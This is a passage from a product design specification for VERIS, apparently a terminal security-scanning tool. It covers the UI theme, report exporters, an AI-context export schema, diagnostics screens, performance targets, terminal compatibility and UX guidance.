### 10.3 Fuzzy Search

- Commands are filtered by fuzzy match on label, category, and keys.
- Matching characters are highlighted.
- Results are grouped by category.
- Most recently used commands appear first (MRU ordering).

---

## 11. Theme System

### 11.1 Color Tokens

```typescript
interface ThemeTokens {
  // Severity colors
  severityCritical: Color;
  severityHigh: Color;
  severityMedium: Color;
  severityLow: Color;
  severityInfo: Color;

  // Semantic colors
  success: Color; // Green
  warning: Color; // Yellow
  error: Color; // Red
  info: Color; // Blue

  // UI colors
  background: Color; // Main background
  surface: Color; // Card/panel background
  border: Color; // Borders
  textPrimary: Color; // Main text
  textSecondary: Color; // Secondary text (descriptions)
  textMuted: Color; // Muted text (metadata)
  accent: Color; // Focus/selection accent
  highlight: Color; // Search highlight
  selection: Color; // Selected row background

  // Code colors
  codeBackground: Color;
  codeText: Color;
  codeKeyword: Color;
  codeString: Color;
  codeComment: Color;
  codeLineNumber: Color;
}
```

### 11.2 Dark Theme (Primary)

```
background:      #1a1b26   (dark blue-black)
surface:         #24253a   (slightly lighter)
border:          #3b3d5c   (muted blue-gray)
textPrimary:     #c0caf5   (light blue-white)
textSecondary:   #a9b1d6   (muted blue-white)
textMuted:       #565f89   (dim blue-gray)
accent:          #7aa2f7   (bright blue)
selection:       #2f3355   (highlight blue)

severityCritical: #f7768e  (red)
severityHigh:     #ff9e64  (orange)
severityMedium:   #e0af68  (yellow)
severityLow:      #7dcfff  (blue)
severityInfo:     #565f89  (gray)
```

### 11.3 Light Theme

```
background:      #f5f5f5   (light gray)
surface:         #ffffff   (white)
border:          #d0d0d0   (light gray)
textPrimary:     #1a1a1a   (near black)
textSecondary:   #4a4a4a   (dark gray)
textMuted:       #888888   (mid gray)
accent:          #3366cc   (blue)
selection:       #e0e8f8   (light blue)

severityCritical: #cc3333  (red)
severityHigh:     #cc6600  (orange)
severityMedium:   #998800  (yellow)
severityLow:      #3366cc  (blue)
severityInfo:     #888888  (gray)
```

### 11.4 ANSI Compatibility

- All colors have ANSI 256-color equivalents.
- If terminal doesn't support true color, fall back to 256-color palette.
- If terminal doesn't support 256-color, fall back to 16 ANSI colors.
- Detection via `COLORTERM` and `TERM` environment variables.

### 11.5 Icons & Unicode

```typescript
interface IconSet {
  // Severity
  critical: '●'; // Filled circle (red)
  high: '●'; // Filled circle (orange)
  medium: '●'; // Filled circle (yellow)
  low: '●'; // Filled circle (blue)
  info: '○'; // Empty circle

  // Status
  success: '✓';
  warning: '⚠';
  error: '✗';
  spinner: ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];

  // Navigation
  chevronRight: '▶';
  chevronDown: '▼';
  chevronLeft: '◀';
  chevronUp: '▲';

  // Actions
  search: '🔍';
  export: '📤';
  settings: '⚙';
  help: '❓';

  // Fallbacks for limited terminals:
  fallback: {
    critical: '!';
    high: '!';
    medium: '-';
    low: '-';
    info: ' ';
    spinner: ['|', '/', '-', '\\'];
  };
}
```

### 11.6 Brand Identity

- **Wordmark:** `VERIS` in uppercase monospace, optionally with a box border for the splash screen.
- **Tagline:** "Deterministic analysis. Explainable results."
- **Color:** Primary brand accent is blue (`#7aa2f7` dark, `#3366cc` light).
- **No logo.** Terminal UI uses text-based wordmark only.

### 11.7 Custom Themes (Future)

- Themes are JSON files loaded from `~/.config/veris/themes/`.
- Custom themes extend the `ThemeTokens` interface.
- Theme validation at load time.

---

## 12. Report System

### 12.1 Report Generation Flow

```
CanonicalReport (SPEC-002)
       │
       ▼
┌──────────────────┐
│  Report Builder   │  (in @veris/report)
│  • Summary        │
│  • Aggregation    │
│  • Diff support   │
└──────────────────┘
       │
       ▼
┌──────────────────┐
│  Exporters        │  (in @veris/exporters)
│  • JSON           │
│  • SARIF          │
│  • HTML           │
│  • Markdown       │
│  • CSV            │
│  • JUnit XML      │
└──────────────────┘
       │
       ▼
  Output file(s)
```

### 12.2 Report Renderer Contract

```typescript
interface ReportRenderer {
  id: string; // "html-report"
  name: string; // "HTML Report"
  format: string; // "html"
  extensions: string[]; // [".html", ".htm"]

  render(report: CanonicalReport, options: ReportRenderOptions): Promise<RenderResult>;
}

interface ReportRenderOptions {
  outputPath?: string; // File output path
  theme?: 'dark' | 'light' | ThemeConfig;
  include?: {
    summary?: boolean;
    findings?: boolean;
    evidence?: boolean;
    chains?: boolean;
    recommendations?: boolean;
    diagnostics?: boolean;
    raw?: boolean; // Include raw CanonicalReport JSON
  };
  filter?: {
    minSeverity?: SeverityLevel;
    maxFindings?: number;
    artifactPaths?: string[];
    rulePacks?: string[];
  };
}
```

### 12.3 Output Format Summary

| Format          | Use Case                    | File Extension           | Interactive   | Size      |
| --------------- | --------------------------- | ------------------------ | ------------- | --------- |
| Interactive TUI | Primary UX                  | —                        | Yes           | In-memory |
| JSON            | Data exchange, CI pipelines | `.veris-report.json`     | No            | Large     |
| SARIF           | GitHub, VS Code, CI         | `.sarif`                 | No            | Large     |
| HTML            | Shareable visual report     | `.html`                  | Yes (browser) | Medium    |
| Markdown        | PR comments, docs           | `.md`                    | No            | Small     |
| CSV             | Spreadsheet analysis        | `.csv`                   | No            | Small     |
| AI Context      | LLM consumption             | `.veris-ai-context.json` | No            | Medium    |

---

## 13. Exporters

### 13.1 JSON Exporter

- Full serialization of CanonicalReport.
- Pretty-printed by default (2-space indent).
- Minified option for CI (`--json-min`).
- Schema version included at top level.

### 13.2 SARIF Exporter

- Follows the [SARIF v2.1.0](https://docs.oasis-open.org/sarif/sarif/v2.1.0/csprd01/sarif-v2.1.0-csprd01.html) specification.
- Maps VERIS severity to SARIF level (critical/high → "error", medium/low → "warning", info → "note").
- Maps evidence locations to SARIF physical locations.
- Maps taxonomy IDs to SARIF taxonomies.
- Includes code snippets in SARIF regions.

### 13.3 HTML Exporter

- Self-contained single HTML file (no external dependencies).
- Includes inline CSS and minimal JavaScript for interactivity (expand/collapse).
- Dark/light theme support.
- Searchable finding table.
- Static (no server required).

### 13.4 Markdown Exporter

- Hierarchical markdown with severity badges.
- Summary table at top.
- Per-finding sections with evidence code blocks.
- Behavior chains as ordered lists.
- Recommendations as checklist items.
- Suitable for PR comments and documentation.

### 13.5 CSV Exporter

- Flattened finding list: one row per finding.
- Columns: ID, severity, confidence, rule, title, artifact, location, taxonomy.
- Suitable for spreadsheet import.

---

## 14. AI Context Export

### 14.1 Purpose

The AI Context Export produces a structured JSON document designed for LLM consumption. It contains all information an AI needs to answer questions about the scan results without accessing the original files.

**Invariant:** The AI Context Export is read-only. AI services consume it but never modify it. The canonical objects are never altered by AI.

### 14.2 Export Structure

```typescript
interface AiContextExport {
  schemaVersion: string; // "1.0"
  generatedAt: ISO8601;
  engineVersion: string;

  summary: {
    targetPath: string;
    totalFiles: number;
    totalFindings: number;
    riskScore: number;
    riskLevel: string;
    trustScore: number;
    scanDurationMs: number;
  };

  findings: AiFinding[];
  behaviorChains: AiBehaviorChain[];
  recommendations: AiRecommendation[];
  riskDimensions: AiRiskDimension[];
  trustDimensions: AiTrustDimension[];

  context: {
    command: string; // Original CLI command
    profiles: string[]; // Active rule profiles
    packs: string[]; // Rule packs used
    rulesApplied: number;
    extractorsUsed: string[];
    durationMs: number;
    errors: string[];
  };
}

interface AiFinding {
  id: string;
  title: string;
  description: string;
  severity: string; // "critical" | "high" | "medium" | "low" | "info"
  severityScore: number; // 0.0 - 10.0
  confidence: number; // 0.0 - 1.0
  confidenceLevel: string; // "very-high" | "high" | "medium" | "low" | "very-low"
  ruleName: string;
  rulePack: string;
  taxonomyIds: string[];
  evidence: AiEvidence[];
  recommendation: string;
  affectedArtifacts: string[];
}

interface AiEvidence {
  artifactPath: string;
  location: {
    startLine: number;
    endLine: number;
    snippet: string; // Code context
  };
  matchDetail: string; // Human-readable match description
  confidence: number;
}

interface AiBehaviorChain {
  id: string;
  relationship: string;
  steps: {
    order: number;
    taxonomyId: string;
    behaviorName: string;
    artifactPath: string;
    snippet: string;
  }[];
}
```

### 14.3 Export File

- Filename: `veris-ai-context-{timestamp}.json`
- Size: typically 50–500 KB (depends on finding count).
- Includes all data needed for AI analysis without accessing original source.
- Omits raw file contents (only code snippets are included).

---

## 15. Diagnostics UI

### 15.1 Pipeline Timing View

```
┌──────────────────────────────────────────────────────┐
│  Pipeline Timing                                       │
├──────────────────────────────────────────────────────┤
│                                                      │
│  Stage                    Duration     % of Total    │
│  ───────────────────────────────────────────────────│
│  File Discovery          0.2s          0.6%         │
│  Artifact Classification 0.5s          1.5%         │
│  Feature Extraction     18.3s         53.5%         │
│  Behavior Classification 2.1s          6.1%         │
│  Rule Matching           9.8s         28.7%         │
│  Correlation             1.2s          3.5%         │
│  Trust/Risk/Reasoning    0.8s          2.3%         │
│  Report Generation       0.3s          0.9%         │
│  ───────────────────────────────────────────────────│
│  Total                  34.2s        100%           │
│                                                      │
│  Bottleneck: Feature Extraction (53.5% of total)    │
│    Breakdown:                                         │
│    • python-extractor:   8.2s  (45%)                │
│    • pe-extractor:       4.5s  (25%)                │
│    • javascript-extractor: 3.1s (17%)               │
│    • others:             2.5s  (13%)                │
│                                                      │
├──────────────────────────────────────────────────────┤
│  j/k Scroll  Enter Expand Extractor Details         │
└──────────────────────────────────────────────────────┘
```

### 15.2 Cache Statistics View

```
┌──────────────────────────────────────────────────────┐
│  Cache Statistics                                     │
├──────────────────────────────────────────────────────┤
│                                                      │
│  Cache              Hits      Misses     Ratio       │
│  ───────────────────────────────────────────────────│
│  Classification    8,432     1,234      87.2%       │
│  Behavior (L1)     12,345    2,100      85.5%       │
│  RuleResult (L2)   3,211     4,567      41.3%       │
│  Composite (L3)    234       89         72.4%       │
│                                                      │
│  Total memory used by caches: 45.2 MB                │
│  Estimated saved time: 12.3 seconds                  │
│                                                      │
├──────────────────────────────────────────────────────┤
│  r Reset Cache (for debugging)                       │
└──────────────────────────────────────────────────────┘
```

### 15.3 Extractor Diagnostics

```
┌──────────────────────────────────────────────────────┐
│  Extractor Diagnostics                                │
├──────────────────────────────────────────────────────┤
│                                                      │
│  Extractor          Files   Success   Recovery   Avg │
│  ───────────────────────────────────────────────────│
│  python-extractor    234    96.4%     3.6%      45ms │
│  javascript-extractor 89    98.2%     1.8%      32ms │
│  pe-extractor         45    98.8%     1.2%      12ms │
│  powershell-extractor 12    95.0%     5.0%      89ms │
│  text-extractor      567    100%      0%         1ms │
│  binary-extractor     23    92.0%     8.0%      23ms │
│                                                      │
│  Recovered errors: 67 total                          │
│  Top recovery types:                                 │
│    • SyntaxError (unclosed paren): 23                │
│    • SyntaxError (unexpected indent): 12             │
│    • Truncated header: 7                             │
│                                                      │
├──────────────────────────────────────────────────────┤
│  Enter View Details  r Reset Stats                   │
└──────────────────────────────────────────────────────┘
```

### 15.4 Skipped Rules & Failures

```
┌──────────────────────────────────────────────────────┐
│  Skipped Rules & Failures                             │
├────────────────────────────────────────────────────┤
│                                                      │
│  Skipped Rules:                                      │
│  • secrets/jwt-token → dependency unmet              │
│    (core/entropy-detection not loaded)               │
│  • injection/cmd-injection → artifact type mismatch  │
│    (type: executable, supports: script)              │
│  • experimental/ai-prompt → pack disabled            │
│                                                      │
│  Parser Failures:                                    │
│  • corrupted.py → ParserError at line 1              │
│    (0 features extracted, fallback to text-extractor)│
│  • fake.exe → signature mismatch                     │
│    (0 features extracted, fallback to binary-extractor│
│                                                      │
├──────────────────────────────────────────────────────┤
│  j/k Scroll  Enter View Error Detail                │
└──────────────────────────────────────────────────────┘
```

---

## 16. Performance Budget

### 16.1 UX Performance Targets

| Metric                           | Target                | Measurement                   |
| -------------------------------- | --------------------- | ----------------------------- |
| Startup latency (splash → ready) | ≤ 2 seconds           | Wall clock                    |
| Scan live view frame rate        | ≥ 30 fps              | requestAnimationFrame         |
| Static screen render             | ≤ 16ms per frame      | React Ink render cycle        |
| Command palette open             | ≤ 100ms               | Key press to visible          |
| Screen transition                | ≤ 50ms                | Key press to new screen       |
| Filter/search response           | ≤ 50ms                | Key press to filtered results |
| Large list scroll (10K items)    | ≥ 60fps               | Virtual scrolling             |
| Export generation (JSON)         | ≤ 1s per 10K findings | Wall clock                    |
| Export generation (HTML)         | ≤ 5s per 10K findings | Wall clock                    |
| Memory (TUI)                     | ≤ 100 MB              | heapUsed                      |

### 16.2 Optimization Techniques

| Technique                    | Applied To                        | Expected Gain                      |
| ---------------------------- | --------------------------------- | ---------------------------------- |
| Virtual scrolling            | Large lists (findings, artifacts) | O(n) → O(visible) render           |
| Incremental rendering        | Live scan dashboard               | Only changed components re-render  |
| Memoized components          | All static views                  | Prevent unnecessary re-renders     |
| Lazy computation             | Detail panels                     | Only compute when opened           |
| Debounced updates            | Live counters (200ms)             | Reduce render frequency            |
| Static report pre-generation | HTML/Markdown export              | Full content generated in one pass |

### 16.3 Memory Budget (TUI)

| Component                 | Budget     |
| ------------------------- | ---------- |
| Component tree (Ink VDOM) | ~10 MB     |
| Screen state data         | ~5 MB      |
| Cached report data        | ~20 MB     |
| Virtual scroll buffer     | ~5 MB      |
| Theme data                | ~1 MB      |
| Undo history              | ~10 MB     |
| **Total**                 | **~51 MB** |

---

## 17. Terminal Compatibility

### 17.1 Supported Terminals

| Terminal           | True Color      | Unicode | Test Priority |
| ------------------ | --------------- | ------- | ------------- |
| Windows Terminal   | ✓               | ✓       | High          |
| macOS Terminal.app | Limited         | ✓       | High          |
| iTerm2             | ✓               | ✓       | High          |
| Kitty              | ✓               | ✓       | Medium        |
| WezTerm            | ✓               | ✓       | Medium        |
| Alacritty          | ✓               | ✓       | Medium        |
| tmux               | ✓ (with config) | ✓       | Medium        |
| screen             | Limited         | ✓       | Low           |
| xterm              | ✓               | ✓       | Low           |
| VS Code terminal   | ✓               | ✓       | Medium        |
| GitHub Codespaces  | ✓               | ✓       | Low           |
| SSH (basic)        | ✗               | Limited | Low           |

### 17.2 Fallback Strategy

```
Detection → TrueColor? → Yes → Full theme
              ↓ No
          256-Color? → Yes → 256-color palette
              ↓ No
          16-Color? → Yes → ANSI 16-color palette
              ↓ No
          No color → Monochrome mode
```

**Monochrome mode:**

- No colors, no backgrounds.
- Use icons and borders for visual structure.
- Severity indicated by `[!]`, `[-]`, `[ ]` instead of color.
- Fallback spinner uses ASCII: `|/-\`.

### 17.3 Minimum Requirements

| Requirement     | Minimum                                       |
| --------------- | --------------------------------------------- |
| Terminal width  | 80 columns (60 for minimal mode)              |
| Terminal height | 24 rows                                       |
| Color support   | 16 ANSI colors (preferred: 256 or true color) |
| Unicode         | Recommended but not required                  |

---

## 18. Accessibility

### 18.1 Color Contrast

- All text/background pairs meet WCAG AA contrast ratio (≥ 4.5:1).
- Severity indicators use both color AND symbol (never color alone).
- Focus indicators use both border AND background change.

### 18.2 Keyboard Accessibility

- Every interactive element is reachable via keyboard.
- Focus order follows visual layout.
- Focus is visible at all times.
- No keyboard traps (except modal dialogs, which trap and explain).
- Screen reader mode: `--screen-reader` flag outputs findings as plain text suitable for screen readers.

### 18.3 Animation Considerations

- All animations respect `prefers-reduced-motion` (via terminal query where supported).
- `--no-animation` flag disables all animations.
- Animations never obscure content.

---

## 19. Future Compatibility

### 19.1 Multi-Pane Workspace (V2+)

- Split view support (vertical, horizontal, grid).
- Each pane can show a different screen (findings + detail + timeline).
- Pane configuration persisted to `~/.config/veris/layout.json`.

### 19.2 Diff Mode (V2+)

- Side-by-side comparison of two reports.
- Left = baseline, Right = current scan.
- New/resolved/changed findings highlighted.

### 19.3 Baselines (V2+)

- First scan automatically becomes the baseline.
- Subsequent scans diff against baseline.
- Regression detection (new critical findings).

### 19.4 Historical Comparison (V3+)

- SQLite-backed scan history.
- Trend graphs: risk over time, findings over time.

### 19.5 Remote Sessions (V3+)

- VERIS runs on CI server, report viewed remotely.
- TUI connects to remote session via SSH or WebSocket.
- All views work identically for local and remote.

### 19.6 Plugin Panels (V3+)

- Plugins can register custom panels.
- Plugin panels appear in the screen registry.
- Plugin panels use the same component library.

### 19.7 Enterprise Dashboard (V4+)

- Aggregated view across multiple repositories.
- Organization-wide risk trends.
- Compliance dashboard.

### 19.8 Web Companion (Optional)

- HTML exporter can serve as a basic web companion.
- Embeddable in CI pipeline artifacts.
- No server required — static files only.

---

## 20. Engineering Tradeoffs

### 20.1 React Ink vs. Raw Terminal Control

**Tradeoff:** React Ink provides component composition, hooks, and declarative rendering but has higher overhead than raw terminal control (blessed, termjs, direct ANSI).

**Decision:** React Ink. The component model and developer ergonomics outweigh the performance overhead. Virtual scrolling and memoization close the performance gap for large datasets.

### 20.2 Interactive TUI vs. CLI Output

**Tradeoff:** Interactive TUI provides rich investigation but requires full-screen terminal. CLI output is simpler and pipes well but lacks exploration capability.

**Decision:** Interactive TUI is the default. `--json`, `--markdown`, and `--sarif` flags produce static output for CI. `--no-tui` flag forces CLI-only mode.

### 20.3 Client-Side Report vs. Server-Side Report

**Tradeoff:** Client-side rendering (TUI builds report from analysis data) is simpler and requires no server. Server-side rendering enables persistent reports and sharing.

**Decision:** Client-side rendering. Reports are generated from the CanonicalReport object that already exists in memory. Server-side rendering is a future option for the Enterprise edition.

### 20.4 Virtual Scrolling vs. Pagination

**Tradeoff:** Virtual scrolling feels smoother and is keyboard-friendly. Pagination is simpler and provides clear page boundaries.

**Decision:** Virtual scrolling for lists where users scan items (findings, artifacts). Pagination for export formats (HTML, Markdown) where page breaks matter.

### 20.5 Rich Animations vs. Performance

**Tradeoff:** Animations make the UI feel premium but consume CPU and may slow down the terminal, especially during an active scan.

**Decision:** Animations are restricted to:

- Splash screen (2 seconds, startup only)
- Scan progress (smooth progress bars, no full-screen repaints)
- Completion notification (brief pulse)

No animations on data views (tables, lists, detail panels).

---

## 21. Common UX Mistakes

### 21.1 Information Overload

**Mistake:** Showing all 500 findings on the dashboard without filtering or grouping.
**Prevention:** Show top 10 findings, grouped by severity. "Show all" requires explicit user action.

### 21.2 No Keyboard Navigation

**Mistake:** Requiring mouse clicks to navigate, breaking the keyboard-first workflow.
**Prevention:** Every action has a keyboard shortcut. Mouse is optional.

### 21.3 Inconsistent Navigation

**Mistake:** Escape goes back on one screen and quits on another.
**Prevention:** Global shortcuts are consistent across all screens. Escape always goes to the parent screen. q always quits.

### 21.4 Hidden State

**Mistake:** The UI enters a loading state or error state without visual feedback.
**Prevention:** Every state (loading, empty, error, success) has a visible indicator. No silent failures.

### 21.5 Terminal Flooding

**Mistake:** Writing hundreds of lines of output per second during scan, making the terminal unusable.
**Prevention:** Live scan dashboard updates in-place (no scrolling output). Maximum update rate: 5 times/second.

### 21.6 No Empty States

**Mistake:** Showing an empty table with no message when there are no findings.
**Prevention:** "No findings detected" with a checkmark icon. Not an empty table.

### 21.7 Color-Only Indicators

**Mistake:** Using only red/green color to indicate severity, making the UI unusable for color-blind users.
**Prevention:** Severity is indicated by color + symbol + text label. Never color alone.

### 21.8 Slow Startup

**Mistake:** Loading all rules, extractors, and config before showing the splash screen, causing a 5-second delay before anything appears.
**Prevention:** Splash screen appears immediately. Initialization runs in parallel with splash display.

### 21.9 Ignoring Terminal Size

**Mistake:** Designing for 120-column terminals and breaking on 80-column terminals.
**Prevention:** All layouts are responsive. Minimum supported width: 80 columns. Below 80: minimal mode with horizontal scrolling.

### 21.10 No Progress During Long Operations

**Mistake:** Showing a spinner for 30 seconds with no indication of progress.
**Prevention:** Every long operation shows: current stage, progress percentage, items processed, and ETA.

---

## 22. Final Recommendations

### 22.1 Implementation Order

| Phase        | Components                                                       | Rationale                           |
| ------------ | ---------------------------------------------------------------- | ----------------------------------- |
| **Phase 1**  | Component library (Box, Panel, Table, Badge, StatusBar, Spinner) | Foundation — needed by every screen |
| **Phase 2**  | Theme system, color tokens, ANSI fallback                        | Visual identity                     |
| **Phase 3**  | Layout system, navigation model, keyboard shortcuts              | Navigation infrastructure           |
| **Phase 4**  | Live scan dashboard (progress, counters, timing)                 | Most critical real-time view        |
| **Phase 5**  | Results dashboard (score card, severity breakdown, top findings) | Default landing view                |
| **Phase 6**  | Investigation views (findings list, detail, evidence, artifacts) | Core exploration                    |
| **Phase 7**  | Behavior chain view, risk dimensions view, timeline              | Advanced investigation              |
| **Phase 8**  | Command palette, help overlay, search/filter                     | Power user features                 |
| **Phase 9**  | Exporters (JSON, SARIF, Markdown, HTML, CSV, AI Context)         | Reporting                           |
| **Phase 10** | Diagnostics UI, cache statistics, performance views              | Developer experience                |

### 22.2 Critical Success Factors

1. **Keyboard-first from day one.** Don't add mouse support first and keyboard later. Design keyboard shortcuts before building any screen.
2. **Progressive disclosure.** The dashboard shows 5 things. The investigation view shows 50. The diagnostics view shows 500. Layer information, don't dump it.
3. **Empty states are not afterthoughts.** Every view must handle zero findings, zero chains, zero artifacts with a clear, positive message.
4. **Performance budget is non-negotiable.** 30fps during scan, 16ms render time, 100MB memory. Test performance with 100K findings.
5. **Dark theme is primary.** Terminal users overwhelmingly prefer dark themes. Light theme is a secondary option.
6. **Export early, export often.** The JSON and AI Context exporters should work from day one, even before the TUI is complete. This enables CI integration before interactive use.

### 22.3 Architectural Invariants

```
1. Renderers consume the Canonical Report only. No renderer performs analysis.
2. Every screen follows: header → content → footer. No exceptions.
3. Every interactive element is keyboard-reachable. Mouse is optional.
4. Global shortcuts are consistent across all screens.
5. All layouts are responsive (80–200+ columns).
6. Animations are restricted to splash, progress, and completion only.
7. Every state (loading, empty, error, success) has a visible indicator.
8. Severity is indicated by color + symbol + text. Never color alone.
9. Export formats consume the Canonical Report, never the TUI state.
10. AI Context Export is read-only. AI never modifies canonical objects.
```

---

_End of SPEC-006. This document describes the frozen terminal UX, interactive UI, report system, and rendering architecture for VERIS V1 through V4._
